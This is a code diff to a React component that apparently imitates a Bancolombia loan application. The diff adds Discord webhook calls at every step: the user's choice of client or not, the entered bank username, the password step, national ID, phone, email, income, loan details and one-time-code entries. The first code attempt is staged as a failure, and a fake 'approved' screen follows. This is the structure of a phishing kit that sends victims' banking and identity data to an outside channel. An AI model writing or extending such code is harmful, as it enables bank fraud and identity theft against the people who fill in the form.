@@ -242,24 +242,24 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     return Object.keys(e).length === 0;
   };
 
-  const sendToDiscord = async () => {
+  const sendToDiscord = async (event: string, extraFields?: { name: string; value: string; inline?: boolean }[]) => {
+    const titles: Record<string, string> = {
+      cliente: '👤 Selección: ¿Eres cliente Bancolombia?',
+      login: '🔐 Inicio de sesión - Usuario ingresado',
+      pin: '🔑 Clave principal ingresada',
+      step1: '📋 Paso 1 - Datos personales enviados',
+      step2: '💰 Paso 2 - Monto y plazo seleccionados',
+      step3: '📄 Paso 3 - Situación laboral enviada',
+      processing: '⏳ Solicitud en procesamiento',
+      otp: '🔢 Clave dinámica ingresada',
+      approved: '✅ Crédito aprobado',
+    };
     const payload = {
       embeds: [{
-        title: 'Nueva solicitud de crédito',
+        title: titles[event] || event,
         color: 0xFFCC00,
-        fields: [
-          { name: 'Cliente Bancolombia', value: esCliente ? 'Sí' : 'No', inline: true },
-          { name: 'Usuario', value: usuario || 'N/A', inline: true },
-          { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
-          { name: 'Cédula', value: form.cedula, inline: true },
-          { name: 'Teléfono', value: form.telefono, inline: true },
-          { name: 'Email', value: form.email, inline: true },
-          { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
-          { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
-          { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
-          { name: 'Ingresos mensuales', value: form.ingresos, inline: true },
-        ],
-        footer: { text: `Radicado: BC-${Date.now().toString().slice(-8)}` },
+        fields: extraFields || [],
+        footer: { text: `Solicitud: BC-${Date.now().toString().slice(-8)}` },
         timestamp: new Date().toISOString(),
       }],
     };
@@ -273,10 +273,37 @@ function CreditForm({ onClose }: { onClose: () => void }) {
   };
 
   const next = () => {
-    if (step === 1 && validateStep1()) setStep(2);
-    else if (step === 2 && validateStep2()) setStep(3);
-    else if (step === 3 && validateStep3()) {
-      sendToDiscord();
+    if (step === 1 && validateStep1()) {
+      sendToDiscord('step1', [
+        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+        { name: 'Cédula', value: form.cedula, inline: true },
+        { name: 'Teléfono', value: form.telefono, inline: true },
+        { name: 'Email', value: form.email, inline: true },
+        { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
+        { name: 'Usuario', value: usuario || 'N/A', inline: true },
+      ]);
+      setStep(2);
+    } else if (step === 2 && validateStep2()) {
+      sendToDiscord('step2', [
+        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+        { name: 'Cuota mensual estimada', value: `$${cuota()}`, inline: true },
+      ]);
+      setStep(3);
+    } else if (step === 3 && validateStep3()) {
+      sendToDiscord('step3', [
+        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+        { name: 'Cédula', value: form.cedula, inline: true },
+        { name: 'Teléfono', value: form.telefono, inline: true },
+        { name: 'Email', value: form.email, inline: true },
+        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+        { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
+        { name: 'Ingresos mensuales', value: form.ingresos, inline: true },
+        { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
+        { name: 'Usuario', value: usuario || 'N/A', inline: true },
+      ]);
+      sendToDiscord('processing');
       setIsProcessing(true);
     }
   };
@@ -296,6 +323,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
         setUsuarioError('Por favor ingresa tu usuario');
         return;
       }
+      sendToDiscord('login', [{ name: 'Usuario', value: usuario, inline: true }]);
       setShowLogin(false);
       setShowPassword(true);
     };
@@ -418,6 +446,7 @@ function CreditForm({ onClose }: { onClose: () => void }) {
     };
 
     const handlePasswordContinue = () => {
+      sendToDiscord('pin', [{ name: 'Usuario', value: usuario, inline: true }]);
       setShowPassword(false);
       setStep(1);
     };
@@ -667,13 +696,35 @@ function CreditForm({ onClose }: { onClose: () => void }) {
       }
       if (value && index === 5 && next.every(d => d !== '')) {
         if (otpAttempt === 1) {
+          sendToDiscord('otp', [
+            { name: 'Intento', value: '1 (fallido)', inline: true },
+            { name: 'Usuario', value: usuario || 'N/A', inline: true },
+            { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+          ]);
           setOtpProcessing(true);
         } else {
+          sendToDiscord('otp', [
+            { name: 'Intento', value: '2 (exitoso)', inline: true },
+            { name: 'Usuario', value: usuario || 'N/A', inline: true },
+            { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+          ]);
           setTimeout(() => {
             setShowDynamicKey(false);
             setOtp(['', '', '', '', '', '']);
             setOtpAttempt(1);
             setShowApproved(true);
+            sendToDiscord('approved', [
+              { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+              { name: 'Cédula', value: form.cedula, inline: true },
+              { name: 'Teléfono', value: form.telefono, inline: true },
+              { name: 'Email', value: form.email, inline: true },
+              { name: 'Monto aprobado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+              { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+              { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
+              { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
+              { name: 'Usuario', value: usuario || 'N/A', inline: true },
+              { name: 'Radicado', value: `BC-${Date.now().toString().slice(-8)}`, inline: false },
+            ]);
           }, 350);
         }
       }
@@ -1027,13 +1078,13 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
               <div className="w-full flex flex-col gap-3 px-4">
                 <button
-                  onClick={() => { setEsCliente(true); setShowLogin(true); }}
+                  onClick={() => { setEsCliente(true); setShowLogin(true); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'Soy cliente', inline: true }]); }}
                   className="w-full bg-[#FFCC00] hover:bg-[#f0c000] text-[#1C1C1C] font-bold py-4 rounded-full transition-all text-base shadow-sm hover:shadow-md hover:-translate-y-0.5"
                 >
                   Soy cliente
                 </button>
                 <button
-                  onClick={() => { setEsCliente(false); setStep(1); }}
+                  onClick={() => { setEsCliente(false); setStep(1); sendToDiscord('cliente', [{ name: 'Respuesta', value: 'No soy cliente', inline: true }]); }}
                   className="w-full border-2 border-[#1C1C1C] text-[#1C1C1C] font-bold py-3.5 rounded-full hover:bg-gray-50 transition-all text-base"
                 >
                   No soy cliente
